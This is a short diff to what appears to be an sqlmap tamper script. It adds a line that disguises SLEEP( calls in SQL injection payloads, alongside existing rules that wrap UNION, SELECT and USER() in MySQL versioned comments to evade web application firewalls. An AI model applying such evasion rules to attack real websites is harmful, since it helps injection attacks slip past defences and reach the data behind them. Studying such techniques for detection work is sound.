@@ -24,4 +24,5 @@ def tamper(payload, **kwargs):
         payload=payload.replace('UNION ALL SELECT','/*!11444union*/ /*!11444all*/ /*!11444select*/')
         payload=payload.replace("SELECT","/*!12447select*/")
         payload=payload.replace(" USER()"," user/*!80000aaa*/()")
+        payload=payload.replace("SLEEP(","sleep/*!80000aaa*/(")
         return payload
